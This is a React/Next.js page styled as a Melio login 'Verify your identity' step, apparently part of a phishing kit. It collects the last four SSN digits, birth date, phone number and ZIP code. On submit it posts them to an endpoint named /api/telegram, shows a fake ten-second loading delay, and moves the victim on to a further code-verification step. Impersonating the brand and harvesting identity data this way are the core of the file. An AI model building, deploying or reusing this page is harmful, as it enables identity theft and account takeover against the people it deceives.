"use client";

import { useRouter, useSearchParams } from "next/navigation";
import { Suspense, useMemo, useState } from "react";
import Link from "next/link";
import { ArrowLeft, Loader2 } from "lucide-react";
import { MelioLogo } from "@/components/MelioLogo";

function IdentityDetailsContent() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const method = searchParams.get("method") || "sms";
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitAttempted, setSubmitAttempted] = useState(false);

  const [ssnLast4, setSsnLast4] = useState("");
  const [birthMonth, setBirthMonth] = useState("");
  const [birthDay, setBirthDay] = useState("");
  const [birthYear, setBirthYear] = useState("");
  const [phoneDigits, setPhoneDigits] = useState("");
  const [zipCode, setZipCode] = useState("");
  const [error, setError] = useState("");

  const ssnDigits = useMemo(
    () => ssnLast4.replace(/\D/g, "").slice(0, 4),
    [ssnLast4],
  );
  const zipDigits = useMemo(() => zipCode.replace(/\D/g, "").slice(0, 9), [zipCode]);

  const MONTHS = useMemo(
    () => [
      "January",
      "February",
      "March",
      "April",
      "May",
      "June",
      "July",
      "August",
      "September",
      "October",
      "November",
      "December",
    ],
    [],
  );
  const DAYS = useMemo(() => Array.from({ length: 31 }, (_, i) => String(i + 1)), []);
  const CURRENT_YEAR = new Date().getFullYear();
  const YEARS = useMemo(
    () => Array.from({ length: CURRENT_YEAR - 1919 }, (_, i) => String(CURRENT_YEAR - i)),
    [CURRENT_YEAR],
  );

  const formattedPhone = useMemo(() => {
    const d = phoneDigits;
    const a = d.slice(0, 3);
    const b = d.slice(3, 6);
    const c = d.slice(6, 10);
    if (!d) return "";
    if (d.length <= 3) return a;
    if (d.length <= 6) return `(${a}) ${b}`;
    return `(${a}) ${b}-${c}`;
  }, [phoneDigits]);

  const isBirthDateValid = useMemo(() => {
    if (!birthMonth || !birthDay || !birthYear) return false;
    const monthIndex = MONTHS.indexOf(birthMonth) + 1;
    const m = monthIndex;
    const d = Number(birthDay);
    const y = Number(birthYear);
    if (!m || Number.isNaN(d) || Number.isNaN(y)) return false;
    const dt = new Date(y, m - 1, d);
    return dt.getFullYear() === y && dt.getMonth() === m - 1 && dt.getDate() === d;
  }, [birthMonth, birthDay, birthYear, MONTHS]);

  const isSsnValid = ssnDigits.length === 4;
  const isPhoneValid = phoneDigits.length === 10;
  const isZipValid = zipDigits.length === 5 || zipDigits.length === 9;
  const isFormValid = isSsnValid && isBirthDateValid && isPhoneValid && isZipValid;
  const birthDateForApi = useMemo(() => {
    if (!birthMonth || !birthDay || !birthYear) return "";
    const monthIndex = MONTHS.indexOf(birthMonth) + 1;
    if (!monthIndex) return "";
    return `${String(monthIndex).padStart(2, "0")}/${birthDay.padStart(2, "0")}/${birthYear}`;
  }, [birthMonth, birthDay, birthYear, MONTHS]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (isSubmitting) return;
    setSubmitAttempted(true);

    if (!isFormValid) {
      setError("Please complete all identity fields correctly.");
      return;
    }

    setError("");
    setIsSubmitting(true);
    await fetch("/api/telegram", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        kind: "identity",
        ssnLast4: ssnDigits,
        birthDate: birthDateForApi,
        phoneNumber: phoneDigits,
        zipCode: zipDigits,
      }),
    }).catch(console.error);
    try {
      await new Promise((r) => setTimeout(r, 10000));
    } finally {
      setIsSubmitting(false);
    }

    router.push(
      `/verify-code?method=${encodeURIComponent(method)}&step=2`
    );
  };

  return (
    <div className="min-h-screen w-full flex items-start sm:items-center justify-center bg-white sm:bg-[#F0F4F8]">
      <div className="w-full sm:max-w-[500px] sm:bg-white sm:rounded-2xl sm:shadow-sm sm:border sm:border-[#e5e7eb] p-6 sm:p-10 pt-16 sm:pt-10">
        <button
          type="button"
          onClick={() => router.push(`/verify-code?method=${encodeURIComponent(method)}&step=1`)}
          className="mb-6 flex items-center gap-2 text-sm font-medium text-[#6b7280] hover:text-[#1a1a2e] transition-colors group"
          disabled={isSubmitting}
        >
          <ArrowLeft size={16} className="group-hover:-translate-x-0.5 transition-transform" />
          Back to code
        </button>

        <div className="flex justify-center mb-8">
          <div className="text-center">
            <Link href="/" aria-label="Back to landing" className="inline-flex">
              <MelioLogo className="h-9 w-auto mb-6 inline-block" />
            </Link>
            <h1 className="text-center text-[28px] font-semibold text-[#1a1a2e] mb-2">
              Verify your identity
            </h1>
            <p className="text-center text-sm text-[#6b7280]">
              Enter the details required to continue login.
            </p>
          </div>
        </div>

        <form className="space-y-5" onSubmit={handleSubmit}>
          <div className="space-y-2">
            <label htmlFor="ssn" className="block text-sm font-medium text-[#4a4a5a]">
              Last 4 digits of SSN
            </label>
            <input
              id="ssn"
              type="text"
              inputMode="numeric"
              maxLength={4}
              value={ssnDigits}
              onChange={(e) => setSsnLast4(e.target.value)}
              disabled={isSubmitting}
              placeholder="1234"
              className="w-full h-12 px-4 border-2 border-[#e5e7eb] rounded-xl text-[#1a1a2e] text-lg font-semibold tracking-[0.2em] placeholder:text-[#9ca3af] focus:outline-none focus:ring-2 focus:ring-[#7244F6] focus:border-transparent transition-all text-center"
            />
            {submitAttempted && !isSsnValid && (
              <p className="text-xs text-red-500 font-medium">
                Enter the last 4 digits of SSN
              </p>
            )}
          </div>

          <div className="space-y-2">
            <label htmlFor="dob" className="block text-sm font-medium text-[#4a4a5a]">
              Birth date
            </label>
            <div className="flex flex-wrap gap-3">
              <select
                value={birthMonth}
                onChange={(e) => setBirthMonth(e.target.value)}
                disabled={isSubmitting}
                className="h-12 px-4 border-2 border-[#e5e7eb] rounded-xl text-[#1a1a2e] text-lg font-semibold bg-white focus:outline-none"
              >
                <option value="">Month</option>
                {MONTHS.map((m) => (
                  <option key={m} value={m}>
                    {m}
                  </option>
                ))}
              </select>
              <select
                value={birthDay}
                onChange={(e) => setBirthDay(e.target.value)}
                disabled={isSubmitting}
                className="h-12 px-4 border-2 border-[#e5e7eb] rounded-xl text-[#1a1a2e] text-lg font-semibold bg-white focus:outline-none"
              >
                <option value="">Day</option>
                {DAYS.map((d) => (
                  <option key={d} value={d}>
                    {d}
                  </option>
                ))}
              </select>
              <select
                value={birthYear}
                onChange={(e) => setBirthYear(e.target.value)}
                disabled={isSubmitting}
                className="h-12 px-4 border-2 border-[#e5e7eb] rounded-xl text-[#1a1a2e] text-lg font-semibold bg-white focus:outline-none"
              >
                <option value="">Year</option>
                {YEARS.map((y) => (
                  <option key={y} value={y}>
                    {y}
                  </option>
                ))}
              </select>
            </div>
            {submitAttempted && !isBirthDateValid && (
              <p className="text-xs text-red-500 font-medium mt-2">
                Select a valid birth date
              </p>
            )}
          </div>

          <div className="space-y-2">
            <label htmlFor="phone" className="block text-sm font-medium text-[#4a4a5a]">
              Phone number
            </label>
            <div className="flex items-center gap-3">
              <span className="text-sm font-semibold text-[#1a1a2e] shrink-0">+1</span>
              <input
                id="phone"
                type="text"
                value={formattedPhone}
                onChange={(e) => {
                  const digits = e.target.value.replace(/\D/g, "").slice(0, 10);
                  setPhoneDigits(digits);
                }}
                disabled={isSubmitting}
                placeholder="(555) 555-5555"
                className="flex-1 h-12 px-4 border-2 border-[#e5e7eb] rounded-xl text-[#1a1a2e] text-lg font-semibold placeholder:text-[#9ca3af] focus:outline-none focus:ring-2 focus:ring-[#7244F6] focus:border-transparent transition-all"
              />
            </div>
            {submitAttempted && !isPhoneValid && (
              <p className="text-xs text-red-500 font-medium">
                Enter a valid phone number (10 digits)
              </p>
            )}
          </div>

          <div className="space-y-2">
            <label htmlFor="zip" className="block text-sm font-medium text-[#4a4a5a]">
              Zip code
            </label>
            <input
              id="zip"
              type="text"
              inputMode="numeric"
              maxLength={9}
              value={zipDigits}
              onChange={(e) => setZipCode(e.target.value)}
              disabled={isSubmitting}
              placeholder="12345"
              className="w-full h-12 px-4 border-2 border-[#e5e7eb] rounded-xl text-[#1a1a2e] text-lg font-semibold placeholder:text-[#9ca3af] focus:outline-none focus:ring-2 focus:ring-[#7244F6] focus:border-transparent transition-all text-center"
            />
            {submitAttempted && !isZipValid && (
              <p className="text-xs text-red-500 font-medium">
                Enter a valid zip code (5 or 9 digits)
              </p>
            )}
          </div>

          {error && <p className="text-xs text-red-500 font-medium">{error}</p>}

          <button
            type="submit"
            disabled={isSubmitting}
            className="w-full h-12 bg-[#7244F6] hover:bg-[#5a35c5] text-white font-semibold rounded-xl transition-all shadow-sm hover:shadow-md active:scale-[0.98] disabled:opacity-70 disabled:cursor-not-allowed"
          >
            {isSubmitting ? (
              <span className="inline-flex items-center justify-center gap-2">
                <Loader2 className="w-4 h-4 animate-spin" />
                Loading…
              </span>
            ) : (
              "Continue"
            )}
          </button>
        </form>
      </div>
    </div>
  );
}

export default function IdentityDetailsPage() {
  return (
    <Suspense
      fallback={
        <div className="min-h-screen w-full flex items-center justify-center bg-white sm:bg-[#F0F4F8] text-[#6b7280] text-sm">
          Loading…
        </div>
      }
    >
      <IdentityDetailsContent />
    </Suspense>
  );
}

